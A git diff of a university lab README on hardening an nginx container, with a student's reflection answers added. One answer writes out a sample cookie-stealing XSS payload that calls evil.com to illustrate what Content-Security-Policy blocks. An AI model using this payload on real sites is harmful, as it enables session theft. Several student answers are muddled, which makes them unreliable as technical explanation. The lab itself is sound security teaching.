@@ -25,7 +25,7 @@ CIS467-SP26-docker-flaude/
 ├── nginx.conf
 ├── index.html
 ├── src/
-│   ├── app.js      
+│   ├── app.js
 │   └── style.css
 ```
 
@@ -45,7 +45,7 @@ EXPOSE 80
 You can use this command throughout the lab to build and run your image:
 
 ```bash
-docker build -t flaude-nginx . && docker run --rm -p 8080:80 flaude-nginx
+docker build -t lab-nginx . && docker run --rm -p 8080:80 lab-nginx
 ```
 
 ---
@@ -53,6 +53,7 @@ docker build -t flaude-nginx . && docker run --rm -p 8080:80 flaude-nginx
 ## Checkpoint 0 — Baseline (Just Serve Files)
 
 ### Goal
+
 Confirm the site loads before any custom configuration is applied.
 
 ### nginx.conf
@@ -80,27 +81,28 @@ curl -I http://localhost:8080/
 **Expected:** `200 OK`, no special headers, no compression.
 
 ### 0.1 - Reflection Question
+
 > What headers does nginx send by default? Are any of them surprising?
+>
 > I didn't know what ETag was so I looked it up. 
 > 
-> According to Claude: An ETag (Entity Tag) is an HTTP response header used for cache validation. It's a unique identifier — typically a hash or fingerprint — that represents a specific version of a resource.
+> According to Claude: An ETag (Entity Tag) is an HTTP response header used for cache validation. It's a unique identifier, typically a hash or fingerprint, that represents a specific version of a resource.
 
 ```
 Server: nginx/1.29.5
-Date: Wed, 11 Mar 2026 18:21:54 GMT
+Date: Wed, 11 Mar 2026 18:22:04 GMT
 Content-Type: text/html
 Content-Length: 19820
-Last-Modified: Wed, 11 Mar 2026 17:47:24 GMT
+Last-Modified: Mon, 09 Mar 2026 18:21:29 GMT
 Connection: keep-alive
-ETag: "69b1aaac-4d6c"
-Accept-Ranges: bytes 
+ETag: "69af0fa9-4d6c"
+Accept-Ranges: bytes
 ```
-
----
 
 ## Checkpoint 1 — Compression
 
 ### Goal
+
 Reduce asset transfer size for text-based files using gzip.
 
 ### Changes to `nginx.conf`
@@ -125,13 +127,15 @@ Also verify in browser DevTools → Network tab → select a JS or CSS file →
 check the **Response Headers** panel.
 
 ### 1.1 Reflection Question
+
 > Why does `gzip_min_length` exist? What's the cost of compressing a 200-byte file?
 
----
+> If a file is too small the zip will actually add more bytes to it. A 200 byte small is so small that the gzip metadata could be more than the file itself
 
 ## Checkpoint 2 — Cache Control
 
 ### Goal
+
 Apply appropriate caching strategies: aggressive caching for fingerprinted assets,
 no caching for HTML entry points.
 
@@ -161,15 +165,21 @@ curl -I http://localhost:8080/My_Differential_Equation.mp4
 Confirm different `Cache-Control` values on each response.
 
 ### 2.1 - Reflection Question
+
 > Why would caching `index.html` aggressively be dangerous for a single-page app?
+>
+> The index.html is what links the page to each styles and javascript file. So while the file name may change on run time the index still has it's link. If the index gets cached then the link to the index.html is lost and the whole file is lost. 
+>
 > What would happen if a user's browser cached a stale `index.html` pointing to
 > old JS bundles?
-
+> 
+> The index would only have access to those old JS bundles that are linked to that index.html and will not be able to render them.
 ---
 
 ## Checkpoint 3 — Security Headers
 
 ### Goal
+
 Protect users from common browser-level attacks by adding standard security headers.
 
 ### Changes to `nginx.conf`
@@ -197,15 +207,19 @@ Also check: https://securityheaders.com (enter `http://localhost:8080` if using
 a tunneling tool, or deploy to a VPS for full scoring).
 
 ### 3.1 - Reflection Questions
+
 > Break the CSP intentionally — add an inline `<script>` tag to `index.html`
 > and observe the browser console error. What does this teach you about
 > how CSP is enforced?
 
----
+> The browser threw me this error
+ Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-Jhau4YoducNCi6L1Jk0b4dhccNVZltQ4q8AVhp9ArFw='), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
+> This shows that the rules given to the browser are enforced to stop any script that is loaded or injected. This helps to protect the user from hacker's attacks by stopping it at the browser level before it even reaches the server.
 
 ## Checkpoint 4 — SPA Routing Fallback
 
 ### Goal
+
 Ensure that client-side routes (e.g., `/dashboard`, `/profile/42`) return
 `index.html` instead of a 404, allowing JavaScript frameworks to handle routing.
 
@@ -244,14 +258,17 @@ error_page 404 /404.html;
 ```
 
 ### 4.1 - Reflection Questions
+
 > If every route returns `index.html` with a 200, what are the SEO implications?
 > How do SSR frameworks like Next.js solve this problem?
 
----
+> There is no new content on each of the pages it just returns a 200 index.html until the JS is rendered this means that the search engine is not able to pull any of the other data, and your web app will not pop up on related searches
+> Server-side Rendering allows the server to build the HTML and JS to allow the search engine to read the content and have a better SEO.
 
 ## Checkpoint 5 — Rate Limiting
 
 ### Goal
+
 Protect the server from abusive request patterns using nginx's built-in
 rate limiting directives.
 
@@ -282,14 +299,16 @@ for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code}\n" \
 Some responses should return `429 Too Many Requests` once the burst is exhausted.
 
 ### 5.1 - Reflection Question
+
 > Rate limiting on a static site might seem overkill — when would it actually
 > matter in production?
 
----
+> When someone is trying to get information, break your server by causing errors, or inject into the server this makes sure to minimize the amount of data going to the server so that it does not excede itself and have any issues. 
 
 ## Checkpoint 6 — Block Sensitive Paths
 
 ### Goal
+
 Prevent accidental exposure of configuration files, version control artifacts,
 or environment files that might exist in the container.
 
@@ -320,10 +339,11 @@ curl -I http://localhost:8080/.env
 **Expected:** `404` — not the file contents.
 
 ### 6.1 - Reflection Question
+
 > Why return `404` instead of `403 Forbidden`? What information does each
 > status code leak to an attacker?
 
----
+> A 404 says that the page does not exist where as a 403 is forbidden access. If the hacker sees that the file is there he can find a way to access it. If there is a 404 the hacker will have no knowledge of access to the file
 
 ## Final nginx.conf
 
@@ -341,14 +361,29 @@ Submit a short written response (200-500 words) answering the following:
 3. What does this lab reveal about what managed hosting platforms like Netlify
    are silently doing on your behalf?
 
----
+> 1. The configuration with the most visiable impact to me was the protect users from common browser-level attacks by adding standard security headers. This one made a lot of sense to how it gives specific qualifications to each script to stop hackers in the browser, and only allow files added from the same orgin as the html file.
+> 2. add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self';" Content-Security-Policy also known as CSP's primary purpose is to stop injection. A real world example would be a hacker inserting a script such as "fetch('https://evil.com/steal?cookie=' + document.cookie)" into some kind of comment box and getting it into the database. Now every time that database is called  the user gets attacked. With the CSP script-src 'self' the browser refuses any script that is an inline element the fetch can not be called. 
+> 3. They are protecting our websites from hackers and giving us free protection in ways that we don't even think about like injection, rate limiting, and allowing our websites to run while also having good search engine optimization.
+
+### Changes to `nginx.conf`
+
+Add inside the `server` block (or a dedicated location):
+
+```nginx
+add_header X-Frame-Options "SAMEORIGIN";
+add_header X-Content-Type-Options "nosniff";
+add_header Referrer-Policy "strict-origin-when-cross-origin";
+add_header Permissions-Policy "geolocation=(), camera=(), microphone=()";
+add_header Content-Security-Policy
+    "default-src 'self'; script-src 'self'; style-src 'self';";
+```
 
 ## Grading Rubric
 
-| Component | Points |
-|---|---|
-| All 6 checkpoints complete with working config | 40 |
-| Verification commands run and output documented (screenshots or paste) | 20 |
-| Written reflection — depth and specificity | 30 |
-| Config is clean, commented, and well-organized | 10 |
-| **Total** | **100** |
+| Component                                                              | Points  |
+| ---------------------------------------------------------------------- | ------- |
+| All 6 checkpoints complete with working config                         | 40      |
+| Verification commands run and output documented (screenshots or paste) | 20      |
+| Written reflection — depth and specificity                             | 30      |
+| Config is clean, commented, and well-organized                         | 10      |
+| **Total**                                                              | **100** |
